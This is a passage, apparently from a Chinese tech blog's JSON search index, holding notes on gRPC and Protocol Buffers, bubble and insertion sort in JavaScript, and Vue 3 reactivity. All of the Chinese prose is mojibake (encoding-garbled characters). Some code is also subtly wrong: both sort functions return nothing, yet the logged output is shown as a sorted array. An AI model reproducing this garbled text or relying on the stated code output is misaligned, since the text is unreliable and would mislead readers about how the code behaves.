çš„ä»»å‹™ï¼›Parse Protocol Bufferï¼ˆbinary formatï¼‰å› ç‚ºæ›´æ¥è¿‘åº•å±¤æ©Ÿå™¨è¡¨å¾µè³‡æ–™çš„æ–¹å¼ï¼Œæ¶ˆè€—çš„ CPU è³‡æºè¼ƒä½ è·¨ç¨‹å¼èªè¨€ï¼šProtocol Buffer å¯ä»¥æ ¹æ“šä¸åŒçš„ç¨‹å¼èªè¨€ç·¨è­¯å‡ºä¸åŒçš„æª”æ¡ˆ å¯ä»¥å¯«è¨»è§£ã€å‹åˆ¥æ¸…æ¥šæ˜ç¢º TIP\nç¯€çœç¶²è·¯å‚³è¼¸é‡å’Œ CPU æ¶ˆè€—åœ¨è¡Œå‹•è£ç½®ä¸Šçš„å½±éŸ¿å¯èƒ½æ›´é‡è¦ã€‚\nè·¨ç¨‹å¼èªè¨€çš„å¥½è™• é€é Protocol Buffer å®šç¾©å¥½è³‡æ–™çš„å‚³è¼¸æ¬„ä½ï¼ˆmessageï¼‰å’Œå‘¼å«çš„æ–¹æ³•ï¼ˆserviceï¼‰å¾Œï¼ŒgRPC å³å¯åœ¨ä¸åŒç¨‹å¼èªè¨€ä¸Šé‹è¡Œï¼Œé€™éå¸¸é©åˆå¾®æœå‹™ï¼ˆmicro-servicesï¼‰çš„æ‡‰ç”¨æƒ…å¢ƒï¼Œåªè¦é›™æ–¹ä¸€èµ·å®šç¾©å¥½ schema å¾Œï¼Œå°±å¯ä»¥ç”¨ä¸åŒçš„ç¨‹å¼èªè¨€é€²è¡Œé–‹ç™¼ã€‚\nä½¿ç”¨ HTTP/2 çš„å¥½è™• HTTP/2 vs HTTP/1 - Performance Comparison? Demoï¼šPerformance difference between HTTP2 and HTTP1.1 ç€è¦½å™¨å…è¨±çš„ä½µç™¼è«‹æ±‚è³‡æºæ•¸æ˜¯æœ‰é™åˆ¶çš„-åˆ†æ @ ITRead01 å‚³çµ±çš„ HTTP/1.1 åœ¨æ¯å€‹ TCP é€£ç·šä¸­åªå…è¨±å‘ server ç™¼é€å–®ä¸€å€‹è«‹æ±‚ï¼Œä½†ç•¶ç¶²é è¼‰å…¥æ™‚ï¼Œå¾€å¾€æœƒéœ€è¦å‘åŒä¸€å€‹ä¼ºæœå™¨ç™¼é€å¤šå€‹è«‹æ±‚ï¼ˆä¾‹å¦‚ã€åœ–æª”ã€CSSã€éœæ…‹æª”ã€JS ç­‰ï¼‰ï¼Œå› æ­¤ç‚ºäº†è¦é¿é–‹é€™æ¨£çš„é™åˆ¶ã€åŠ å¿«è¼‰å…¥çš„é€Ÿåº¦ï¼Œç€è¦½å™¨æœƒå¯¦ä½œå¤šå€‹å¹³è¡Œçš„ï¼ˆparallelï¼‰ TPC é€£ç·šï¼ˆæ¯å€‹ç€è¦½å™¨å¯¦ä½œä¸åŒï¼Œå› æ­¤æ•¸é‡çš„ä¸Šé™ä¹Ÿä¸åŒï¼‰ï¼Œä»¥è™•ç†åŒæ™‚å‘ä¼ºæœå™¨ç™¼å‡ºçš„å¤šå€‹è«‹æ±‚ã€‚\nåœ¨ HTTP/2 ä¸­å‰‡å¯åœ¨åŒä¸€å€‹ TCP é€£ç·šä¸­é€²è¡Œå¤šå€‹è«‹æ±‚å’Œå›æ‡‰ï¼Œä¸¦ä¸”å¯ä»¥ç”± server ä¸»å‹•æ¨é€è³‡æºçµ¦ clientï¼Œè€Œä¸¦éä¸€å®šè¦é€é client ä¸»å‹•è«‹æ±‚ï¼›æ­¤å¤–æ”¯æ´ HTTP Header çš„å£“ç¸®ï¼Œæ¸›å°‘è³‡æ–™å‚³æ•¸é‡ï¼›HTTP/2 ä¹Ÿæ˜¯ä½¿ç”¨ binary çš„æ–¹å¼åœ¨å‚³è¼¸è³‡æ–™ã€‚\ngRPC çš„å››ç¨®é¡å‹ Unaryï¼šé¡ä¼¼å‚³çµ± APIï¼Œclient ç™¼é€ request è€Œ server å›å‚³ response Server Streamingï¼šé€é HTTP/2ï¼Œclient ç™¼é€ä¸€æ¬¡ requestï¼Œè€Œ server å¯ä»¥å›å‚³å¤šæ¬¡è³‡æ–™ Client Streamingï¼šclient ç™¼é€å¤šæ¬¡è³‡æ–™ï¼Œç›´åˆ°å‘ŠçŸ¥ server è³‡æ–™å‚³å®Œå¾Œï¼Œserver å†çµ¦äºˆ response Bi Directional Streamingï¼šå…©é‚Šéƒ½ç”¨ä¸²æµçš„æ–¹å¼å‚³é€è³‡æ–™ åœ–ç‰‡ä¾†æºï¼šgRPC Golang - Master Class: Build Modern API \u0026amp; MicroServices @ Udemy\n1 2 3 4 5 6 7 8 9 10 11 12 13 service GreetService { // Unary rpc Greet(GreetRequest) returns (GreetResponse) {}; // Streaming Server rpc GreetManyTimes(GreetManyTimesRequest) returns (stream GreetManyTimesResponse) {}; // Streaming Client rpc LongGreet(stream LongGreetRequest) returns (LongGreetResponse) {}; // Bi-directional Streaming rpc GreetEveryone(stream GreetEveryoneRequest) returns (stream GreetEveryoneResponse) {}; } gRPC çš„ç¼ºé» Protocol Buffer ä¸åƒ JSON æ˜¯ Human Readableã€‚ éœ€è¦é¡å¤–çš„å­¸ç¿’æ™‚é–“å’Œå°å…¥æˆæœ¬ã€‚ ç€è¦½å™¨åŸç”Ÿç›®å‰é‚„ä¸æ”¯æ´ï¼Œé ˆé€éå¥—ä»¶ grpc-web ä¾†è™•ç†ã€‚ å…¶ä»– æ¨è–¦å·¥å…· BloomRPCï¼šæ–¹ä¾¿ç”¨ä¾†æ¨¡æ“¬ Client å° gRPC server ç™¼é€è«‹æ±‚ï¼ŒåŠŸèƒ½å°±é¡ä¼¼åœ¨ Restful ä¸­ä½¿ç”¨çš„ Postmanã€‚ éŒ¯èª¤æ’é™¤ protoc-gen-go: program not found or is not executable\n1 2 # éœ€è¦æŠŠ $GOPATH/bin åŠ åˆ° .zshrc/.bashrc ç­‰ $ echo \u0026#39;export PATH=$PATH:$GOPATH/bin\u0026#39; \u0026gt;\u0026gt; $HOME/.zshrc åƒè€ƒè³‡æ–™ Go Tutorial @ gRPC.io Introduction to gRPC @ gRPC.io Protocol Buffers @ Google Developer gRPC - Golang Master Class: Build Modern API \u0026amp; MicroServices @ Udemy æ¯”è¼ƒ gRPC æœå‹™èˆ‡ HTTP API @ Microsoft Docs ","date":"2022-07-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52276040314_2afa0e7026_o.png","permalink":"https://wayneblog.ga/2022-07-22/grpc-basic-introduction/","title":"gRPC åŸºæœ¬ä»‹ç´¹"},{"content":" åƒè€ƒç¶²ç«™ - JavaScript è³‡æ–™çµæ§‹èˆ‡æ¼”ç®—æ³•ï¼šæ°£æ³¡æ’åº Bubble Sortã€æ’å…¥æ’åº Insertion Sort å¯¦ä½œèˆ‡åˆ†æ - å½­å½­ç›´æ’­\næ’åºæ¼”ç®—æ³• æ°£æ³¡æ’åºæ³•(bubble sort) æ¦‚è¦ ä½¿ç”¨é›™å±¤è¿´åœˆï¼Œç”±å¾Œå¾€å‰ã€‚ æ¯è¼ªå›ºå®šæœ€å³é‚Šçš„å€¼ï¼Œæ¥è‘—å€†å€†æ¯”è¼ƒå¤§å°ï¼Œå°‡å¤§çš„æ”¾å³é‚Šã€‚ ä¸‹è¼ªå‰‡ - 1ã€‚ å®Œç•¢å¾Œå³å¯æ’åºå®Œç•¢ã€‚ åŸ·è¡Œçš„ç¸½è¼ªæ•¸ç‚ºé™£åˆ—é•·åº¦ - 1ã€‚ æ™‚é–“è¤‡é›œåº¦ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 4ï¼Œè¦æ¯”å° 3+2+1 ç¸½å…± 6 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 7ï¼Œè¦æ¯”å° 6+5+\u0026hellip;+1 ç¸½å…± 21 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ nï¼Œè¦æ¯”å° (n-1)+(n-2)+\u0026hellip;+1 ç¸½å…±\n(n * (n - 1)) / 2 = nÂ²/2 - n/2 æ¬¡ æœå°‹æ‰€éœ€æ™‚é–“éš¨è‘—é™£åˆ—çš„é•·åº¦\nå‘ˆå¹³æ–¹æˆé•· O(NÂ²)ã€‚ å‡è¨­ å¯ä»¥åŠ å…¥ä¸€å€‹ flag ä¾†åšåˆ¤å®šï¼Œå‡è¨­æ¯”è¼ƒå®Œç¬¬ä¸€è¼ªç™¼ç¾æ²’æœ‰äº¤æ›çš„æƒ…æ³ç™¼ç”Ÿï¼Œå‰‡ä»£è¡¨å·²ç¶“æ’åºå®Œæˆï¼Œä¸éœ€è¦å†è·‘ä¸‹ä¸€è¼ªï¼Œå³å¯ç¨å¾®å„ªåŒ–æ’åºã€‚ å¯¦ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // å¯¦ä½œæ°£æ³¡æ’åºæ¼”ç®—æ³• function bubbleSort(arr){ // arr æ˜¯ä¸€å€‹æ•¸å­—é™£åˆ— for(let i=arr.length-1;i\u0026gt;=1;i--){ let swap=false; // å‡è¨­æ²’æœ‰äº¤æ›ç™¼ç”Ÿ for(let j=0;j\u0026lt;i;j++){ if(arr[j]\u0026gt;arr[j+1]){ // å¦‚æœé †åºä¸å°ï¼Œäº¤æ› let temp=arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; swap=true; // ç´€éŒ„ç™¼ç”Ÿäº¤æ› } } if(!swap){ // ç™¼ç¾ä¸€æ•´è¼ªä¸­éƒ½æ²’æœ‰äº¤æ›ç™¼ç”Ÿï¼Œç›´æ¥åˆ¤å®šæ’åºå®Œæˆ break; } } } let data = [1, 6, 3, 4]; console.log(bubbleSort(data)); è¼¸å‡ºï¼š 1 \u0026gt; [1, 3, 4, 6] æ’å…¥æ’åºæ³•(insertion sort) æ¦‚è¦ ä½¿ç”¨é›™å±¤è¿´åœˆï¼Œç”±å‰å¾€å¾Œã€‚ å¾ç¬¬äºŒç­†é–‹å§‹ï¼Œæ¯è¼ªå°‡è©²ç­†è³‡æ–™å¾€å‰æ¯”è¼ƒå¤§å°ï¼Œå°‡å¤§çš„æ”¾å³é‚Šï¼šæ¯è¼ªæ¯”è¼ƒå¾ (i - 1) ~ 0ã€‚ ä¸‹è¼ªå‰‡ + 1ã€‚ å®Œç•¢å¾Œå³å¯æ’åºå®Œç•¢ã€‚ åŸ·è¡Œçš„ç¸½è¼ªæ•¸ç‚ºé™£åˆ—é•·åº¦ - 1ã€‚ æ™‚é–“è¤‡é›œåº¦(è¤‡é›œåº¦åŒæ°£æ³¡æ’åºæ³•) å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 4ï¼Œè¦æ¯”å° 1+2+3 ç¸½å…± 6 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ 7ï¼Œè¦æ¯”å° 1+2+\u0026hellip;+6 ç¸½å…± 21 æ¬¡ã€‚ å¦‚æœé™£åˆ—é•·åº¦æ˜¯ nï¼Œè¦æ¯”å° 1+2+\u0026hellip;+(n-1) ç¸½å…±\n(n * (n - 1)) / 2 = nÂ²/2 - n/2 æ¬¡ æœå°‹æ‰€éœ€æ™‚é–“éš¨è‘—é™£åˆ—çš„é•·åº¦\nå‘ˆå¹³æ–¹æˆé•· O(NÂ²)ã€‚ å‡è¨­ å‡è¨­ç•¶å‰æ¯”å°çš„å€¼èˆ‡ç¬¬ä¸€å€‹è¦æ¯”è¼ƒçš„å€¼ä¸€æ¯”è¼ƒï¼Œæ°å¥½æ­£ç¢ºï¼Œå‰‡ä»£è¡¨å‰é¢çš†å·²ç¶“æ’åºå®Œæˆï¼Œå¯ä»¥é€²åˆ°ä¸‹ä¸€è¼ªã€‚ å¯¦ä½œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // å¯¦ä½œæ’å…¥æ’åºæ¼”ç®—æ³• function insertionSort(arr){ // arr æ˜¯ä¸€å€‹æ•¸å­—é™£åˆ— for(let i=1;i\u0026lt;arr.length;i++){ for(let j=i-1;j\u0026gt;=0;j--){ if(arr[j]\u0026gt;arr[j+1]){ // å¦‚æœé †åºä¸å°ï¼Œäº¤æ› [arr[j], arr[j+1]]=[arr[j+1], arr[j]]; // javascript äº¤æ›çš„èªæ³•ç³– }else{ // ä»»ä½•ä¸€æ¬¡æ¯”è¼ƒï¼Œç™¼ç¾é †åºå°äº†ï¼Œé€™ä¸€è¼ªå°±ä¸ç”¨ç¹¼çºŒäº† break; } } } } let data = [1, 6, 3, 4]; console.log(insertionSort(data)); è¼¸å‡ºï¼š 1 \u0026gt; [1, 3, 4, 6] å¤§å‹è³‡æ–™é‡çš„é€²éšæ¢è¨ O(NÂ²)ï¼š(è®€ä½œ big-O Nå¹³æ–¹) æ˜¯ç›¸ç•¶å¯æ€•çš„ï¼Œæ’åºçš„åŸ·è¡Œæ™‚é–“å°‡æœƒæ˜¯è³‡æ–™é‡çš„å¹³æ–¹å€æ•¸æˆé•·ã€‚\næ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // ç”¢ç”Ÿéš¨æ©Ÿè³‡æ–™ let data=[]; for(let i=0;i\u0026lt;100000;i++){ data.push(Math.random()*1000000); } // è³‡æ–™é‡æ˜¯ 100,000ï¼Œæˆ‘çš„æ¼”ç®—æ³•æ™‚é–“è¤‡é›œåº¦æ˜¯ O(N^2)ï¼Œé æœŸè¦èŠ± 100,000^2 = 10,000,000,000 æ¬¡çš„æ¯”è¼ƒé‹ç®— // æˆ‘å€‘çš„é›»è…¦ä¸€ç§’é˜è·‘ 10 å„„å€‹æŒ‡ä»¤(ç²—ç•¥é ä¼° 1 GB) console.time(); // æ’å…¥æ’åºæ³•ï¼Œå¤§ç´„è·‘äº†10å¹¾ç§’ //insertionSort(data); // ä½¿ç”¨ JavaScript å…§å»ºçš„æ’åºåŠŸèƒ½ sort()ï¼Œå¤§ç´„è·‘äº† 0.2 ~ 0.3 ç§’ // å¾ˆæœ‰æ©Ÿæœƒæ˜¯ä½¿ç”¨å¿«é€Ÿæ’åº Quick Sort(å¿«é€Ÿæ’åºæ³•) æˆ–å…¶è®Šå½¢ data.sort(); console.timeEnd(); ","date":"2022-07-21T00:00:00Z","image":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/hqdefault_huc19c1d5e8083f3ca093a0303b2a8247b_19175_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-21/bubble-sort-and-insertion-sort/","title":"å½­å½­çš„èª²ç¨‹ - æ°£æ³¡æ’åºã€æ’å…¥æ’åºçš„å¯¦ä½œèˆ‡åˆ†æ"},{"content":" åƒè€ƒç¶²ç«™ - å°šç¡…è°·Vue3æŠ€è¡“\nå‰µå»º Vue 3.0 å·¥ç¨‹ ä½¿ç”¨ vue cli å‰µå»º å®˜æ–¹æ–‡æª”ï¼šhttps://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create 1 2 3 4 5 6 7 8 9 10 11 12 ## æŸ¥çœ‹ @vue/cli ç‰ˆæœ¬ï¼Œç¢ºä¿ @vue/cli ç‰ˆæœ¬åœ¨ 4.5.0 ä»¥ä¸Š vue --version ## å®‰è£æˆ–å‡ç´šä½ çš„ @vue/cli npm install -g @vue/cli ## å‰µå»º vue create vue_test ## å•Ÿå‹• cd vue_test npm run serve ä½¿ç”¨ vite å‰µå»º(Vueä½œè€…çš„åœ˜éšŠé–‹ç™¼) å®˜æ–¹æ–‡æª”ï¼šhttps://v3.cn.vuejs.org/guide/installation.html#vite viteå®˜ç¶²ï¼šhttps://vitejs.cn/ å„ªå‹¢ï¼š é–‹ç™¼ç’°å¢ƒä¸­ï¼Œç„¡éœ€æ‰“åŒ…æ“ä½œï¼Œå¯å¿«é€Ÿçš„å†·å•Ÿå‹•ã€‚ è¼•é‡å¿«é€Ÿçš„ç†±é‡è¼‰(HMR)ã€‚ çœŸæ­£çš„æŒ‰éœ€ç·¨è­¯ï¼Œä¸å†ç­‰å¾…æ•´å€‹æ‡‰ç”¨ç·¨è­¯å®Œæˆã€‚ å‚³çµ± gruntã€gulpã€webpack èˆ‡ vite æ§‹å»ºå°æ¯”åœ–ï¼š 1 2 3 4 5 6 7 8 9 10 11 ## å‰µå»ºå·¥ç¨‹ npm init vite-app \u0026lt;project-name\u0026gt; ## é€²å…¥å·¥ç¨‹ç›®éŒ„ cd \u0026lt;project-name\u0026gt; ## å®‰è£ä¾è³´ npm install ## å•Ÿå‹• npm run dev å®‰è£ Vue é–‹ç™¼è€…å·¥å…· Vue.js devtools\næ‹‰é–‹åºå¹•çš„ Setup Vue3.0 ä¸­ä¸€å€‹æ–°çš„é…ç½®é …ï¼Œå€¼ç‚ºä¸€å€‹å‡½æ•¸ã€‚ æ˜¯æ‰€æœ‰ Composition API (çµ„åˆå¼API) çš„è¡¨æ¼”èˆå°ã€‚ çµ„ä»¶ä¸­æ‰€ç”¨åˆ°çš„æ•¸æ“šã€æ–¹æ³•ç­‰ç­‰ï¼Œå‡è¦é…ç½®åœ¨ setup ä¸­ã€‚ setup å‡½æ•¸çš„ï¼š è‹¥è¿”å›ä¸€å€‹å°è±¡ï¼Œå‰‡å°è±¡ä¸­çš„å±¬æ€§ã€æ–¹æ³•ï¼Œåœ¨æ¨¡æ¿ä¸­å‡å¯ç›´æ¥ä½¿ç”¨ã€‚(é‡é»é—œæ³¨!) è‹¥è¿”å›ä¸€å€‹æ¸²æŸ“å‡½æ•¸ï¼Œå‰‡å¯ä»¥è‡ªå®šç¾©æ¸²æŸ“å…§å®¹ã€‚(äº†è§£å³å¯) è¿”å›å°è±¡ 1 2 3 4 5 6 7 8 export default { setup() { const name = \u0026#34;æ¸¬è©¦\u0026#34; return { name } } } è¿”å›æ¸²æŸ“å‡½æ•¸(éœ€å¼•å…¥ h ) 1 2 3 4 5 6 import { h } from \u0026#34;vue\u0026#34; export default { setup() { return () =\u0026gt; { return h(\u0026#39;h1\u0026#39;, \u0026#39;å°šç¡…è°·\u0026#39;)} } } æ³¨æ„ï¼š ä¸è¦èˆ‡Vue2.xé…ç½®æ··ç”¨ã€‚ Vue2.xé…ç½®(dataã€methodsã€computed\u0026hellip;)ä¸­å¯ä»¥è¨ªå•åˆ°setupä¸­çš„å±¬æ€§ã€æ–¹æ³•ï¼Œä½†åœ¨setupä¸­ä¸èƒ½è¨ªå•åˆ°Vue2.xé…ç½®(dataã€methodsã€computed\u0026hellip;)ã€‚ å¦‚æœæœ‰é‡åï¼Œsetupå„ªå…ˆã€‚ setup ä¸èƒ½æ˜¯ä¸€å€‹ async å‡½æ•¸ï¼Œå› ç‚ºè¿”å›å€¼ä¸å†æ˜¯ return çš„å°è±¡ï¼Œè€Œæ˜¯ä¸€å€‹ promiseï¼Œæ¨¡æ¿çœ‹ä¸åˆ° return å°è±¡ä¸­çš„å±¬æ€§ï¼›å¾ŒæœŸå¯ä»¥è¿”å›ä¸€å€‹ Promise å¯¦ä¾‹ï¼Œä½†éœ€è¦ Suspense èˆ‡ ç•°æ­¥çµ„ä»¶(å‹•æ…‹çµ„ä»¶) çš„é…åˆï¼šé»æˆ‘å‰å¾€ Suspense ref å‡½æ•¸ ä½œç”¨ï¼šå®šç¾©ä¸€å€‹éŸ¿æ‡‰å¼çš„æ•¸æ“šã€‚ èªæ³•ï¼š 1 const xxx = ref(initValue) å°‡æ•¸æ“šåŠ å·¥æˆä¸€å€‹ RefImpl (Reference: å¼•ç”¨ï¼›Implete: å¯¦ç¾) = (å¼•ç”¨å¯¦ç¾çš„å¯¦ä¾‹å°è±¡)ã€‚ js ä¸­æ“ä½œæ•¸æ“šï¼šxxx.valueã€‚ æ¨¡æ¿ä¸­è®€å–æ•¸æ“šï¼š\u0026lt;div\u0026gt;{{xxx}}\u0026lt;/div\u0026gt; å‚™è¨»ï¼š æ¥æ”¶çš„æ•¸æ“šå¯ä»¥æ˜¯åŸºæœ¬é¡å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å°è±¡é¡å‹ã€‚ åŸºæœ¬é¡å‹çš„æ•¸æ“šï¼šéŸ¿æ‡‰å¼ä¾ç„¶æ˜¯é  Object.defineProperty() çš„ get èˆ‡ set å®Œæˆçš„ã€‚ å°è±¡é¡å‹çš„æ•¸æ“šï¼šå…§éƒ¨æ±‚åŠ©äº† Vue3.0 ä¸­çš„ä¸€å€‹æ–°å‡½æ•¸\u0026mdash;- reactive reactive å‡½æ•¸ ä½œç”¨ï¼šå®šç¾©ä¸€å€‹å°è±¡é¡å‹çš„éŸ¿æ‡‰å¼æ•¸æ“š(åŸºæœ¬é¡å‹åˆ¥ç”¨ä»–ï¼Œç”¨refå‡½æ•¸)ã€‚ èªæ³•ï¼š 1 2 3 4 const xxx = reactive({ name: \u0026#34;æ¸¬è©¦\u0026#34;, age: 18 }) æ¥æ”¶ä¸€å€‹å°è±¡æˆ–æ•¸çµ„ï¼Œè¿”å›ä¸€å€‹ä»£ç†å°è±¡(Proxyå°è±¡)ã€‚ reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ˜¯æ·±å±¤æ¬¡çš„ã€‚ å…§éƒ¨åŸºæ–¼ ES6 çš„ Proxy å¯¦ç¾ï¼Œé€šéä»£ç†å°è±¡æ“ä½œæºå°è±¡å…§éƒ¨æ•¸æ“šéƒ½æ˜¯éŸ¿æ‡‰å¼çš„ï¼Œä¸¦é€šé Reflect æ“ä½œæºå°è±¡å…§éƒ¨çš„æ•¸æ“šã€‚ jsã€æ¨¡æ¿ä¸­æ“ä½œæ•¸æ“šå‡ä¸éœ€è¦ .value Vue 2.0 ä¸­çš„éŸ¿æ‡‰å¼åŸç† å¯¦ç¾åŸç†ï¼š å°è±¡é¡å‹ï¼šé€šé Object.defineProperty() å°å±¬æ€§çš„è®€å–ã€ä¿®æ”¹é€²è¡Œæ””æˆª(æ•¸æ“šåŠ«æŒ)ã€‚ æ•¸çµ„é¡å‹ï¼šé€šéé‡å¯«æ›´æ–°æ•¸çµ„çš„ä¸€ç³»åˆ—æ–¹å¼ä¾†å¯¦ç¾æ””æˆªã€‚(å°æ•¸çµ„çš„è®Šæ›´æ–¹æ³•é€²è¡Œäº†åŒ…è£¹)ã€‚ 1 2 3 4 5 6 7 8 Object.defineProperty(data, \u0026#34;count\u0026#34;, { get() { }, set() { } }) åŸç†æ¨¡æ“¬ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 let person = { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18 } // æ¨¡æ“¬ Vue2 ä¸­å¯¦ç¾éŸ¿æ‡‰å¼ let p = {} Object.defineProperty(p, \u0026#34;name\u0026#34;, { configurable: true, // å…è¨±åˆªé™¤ï¼Œä½†æ•ç²ä¸åˆ° get() { // æœ‰äººè®€å– name æ™‚èª¿ç”¨ return person.name }, set(value) { console.log(\u0026#34;æœ‰äººä¿®æ”¹äº† name å±¬æ€§ï¼Œæˆ‘ç™¼ç¾äº†ã„›ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢ï¼\u0026#34;) person.name = value } }) Object.defineProperty(p, \u0026#34;age\u0026#34;, { configurable: true, // å…è¨±åˆªé™¤ï¼Œä½†æ•ç²ä¸åˆ° get() { // æœ‰äººè®€å– age æ™‚èª¿ç”¨ return person.age }, set(value) { console.log(\u0026#34;æœ‰äººä¿®æ”¹äº† age å±¬æ€§ï¼Œæˆ‘ç™¼ç¾äº†ã„›ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢ï¼\u0026#34;) person.age = value } }) å­˜åœ¨å•é¡Œï¼š æ–°å¢å±¬æ€§ã€åˆªé™¤å±¬æ€§ï¼Œä»‹é¢ä¸æœƒæ›´æ–°ï¼Œéœ€ä½¿ç”¨ $setã€$deleteã€‚ ç›´æ¥é€šéä¸‹æ¨™ä¿®æ”¹æ•¸çµ„ï¼Œä»‹é¢ä¸æœƒæ›´æ–°ï¼Œéœ€ä½¿ç”¨ $setã€$deleteã€‚ å•é¡Œæƒ…æ³æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 export default { data() { return { person: { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, hobby: [\u0026#34;å­¸ç¿’\u0026#34;, \u0026#34;åƒé£¯\u0026#34;] } } }, methods: { addSex() { this.person.sex = \u0026#34;å¥³\u0026#34; // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;å¥³\u0026#34;) // éœ€ä½¿ç”¨ $set ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ Vue.set() // Vue.set(this.person, \u0026#34;sex\u0026#34;, \u0026#34;å¥³\u0026#34;) }, deleteName() { delete this.person.name // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$delete(this.person, \u0026#34;name\u0026#34;) // éœ€ä½¿ç”¨ $delete ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ Vue.delete() // Vue.delete(this.person, \u0026#34;name\u0026#34;) }, updateHobby() { this.person.hobby[0] = \u0026#34;é€›è¡—\u0026#34; // æ­¤æ™‚ç•«é¢ä¸æœƒæ›´æ–° this.$set(this.person.hobby, 0, \u0026#34;é€›è¡—\u0026#34;) // éœ€ä½¿ç”¨ $set ç•«é¢æ‰æœƒæ›´æ–° // æˆ–æ˜¯ä½¿ç”¨ splice() // this.person.hobby.splice(0, 1, \u0026#34;é€›è¡—\u0026#34;) } } } Vue 3.0 ä¸­çš„éŸ¿æ‡‰å¼åŸç† å¯¦ç¾åŸç†ï¼š é€šé Proxy(ä»£ç†)ï¼šæ””æˆªå°è±¡ä¸­ä»»æ„å±¬æ€§çš„è®ŠåŒ–ï¼ŒåŒ…å«å±¬æ€§å€¼çš„è®€å¯«ã€å±¬æ€§çš„æ–°å¢ã€å±¬æ€§çš„åˆªé™¤ç­‰ã€‚ é€šé Reflect(åå°„)ï¼šå°è¢«ä»£ç†å°è±¡çš„å±¬æ€§é€²è¡Œæ“ä½œã€‚ åŸç†æ¨¡æ“¬ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 let person = { name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18 } // æ¨¡æ“¬ Vue3 ä¸­å¯¦ç¾éŸ¿æ‡‰å¼ const p = new Proxy(person, { // æœ‰äººè®€å–pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ get(target, propName) { console.log(`æœ‰äººè®€å–äº†pèº«ä¸Šçš„${propName}å±¬æ€§`) return Reflect.get(target, propName) }, // æœ‰äººæ–°å¢æˆ–ä¿®æ”¹pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ set(target, propName, value) { console.log(`æœ‰äººä¿®æ”¹äº†pèº«ä¸Šçš„${propName}å±¬æ€§ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢äº†ï¼`) Reflect.set(target, propName, value) }, // æœ‰äººåˆªé™¤pçš„æŸå€‹å±¬æ€§æ™‚èª¿ç”¨ deleteProperty(target, propName) { console.log(`æœ‰äººåˆªé™¤äº†pèº«ä¸Šçš„${propName}å±¬æ€§ï¼Œæˆ‘è¦å»æ›´æ–°ä»‹é¢äº†ï¼`) return Reflect.deleteProperty(target, propName) } }) setup çš„å…©å€‹æ³¨æ„é» setup åŸ·è¡Œçš„æ™‚æ©Ÿï¼šåœ¨ beforeCreate ä¹‹å‰åŸ·è¡Œä¸€æ¬¡ï¼Œthis æ˜¯ undefinedã€‚ setup çš„åƒæ•¸ propsï¼šå€¼ç‚ºå°è±¡ï¼ŒåŒ…å«ï¼šçµ„ä»¶å¤–éƒ¨å‚³ééä¾†ï¼Œä¸”çµ„ä»¶å…§éƒ¨è²æ˜æ¥æ”¶äº†çš„å±¬æ€§ã€‚ contextï¼šä¸Šä¸‹æ–‡å°è±¡ï¼š attrsï¼šå€¼ç‚ºå°è±¡ï¼ŒåŒ…å«ï¼šçµ„ä»¶å¤–éƒ¨å‚³ééä¾†ï¼Œä½†æ²’æœ‰åœ¨ props é…ç½®ä¸­è²æ˜çš„å±¬æ€§ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$attrsã€‚ slotsï¼šæ¥æ”¶çš„æ’æ§½å…§å®¹ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$slotsã€‚ emitï¼šåˆ†ç™¼è‡ªå®šç¾©äº‹ä»¶çš„å‡½æ•¸ï¼Œç›¸ç•¶æ–¼ Vue 2.0 çš„ this.$emitã€‚ watch å‡½æ•¸ èˆ‡ Vue 2.0 ä¸­çš„ watch é…ç½®åŠŸèƒ½ä¸€è‡´ã€‚ å…©å€‹å°\u0026quot;å‘\u0026quot;ï¼š ç›£è¦– ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ™‚ï¼Œä¸éœ€åŠ  .valueã€‚ ç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šæ™‚ï¼ŒoldValue ç„¡æ³•æ­£ç¢ºæ•ç²ã€å¼·åˆ¶é–‹å•Ÿäº†æ·±åº¦ç›£è¦–(deepé…ç½®å¤±æ•ˆ)ã€‚ ç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šä¸­çš„æŸå€‹å±¬æ€§æ™‚ï¼Œdeep é…ç½®æœ‰æ•ˆã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 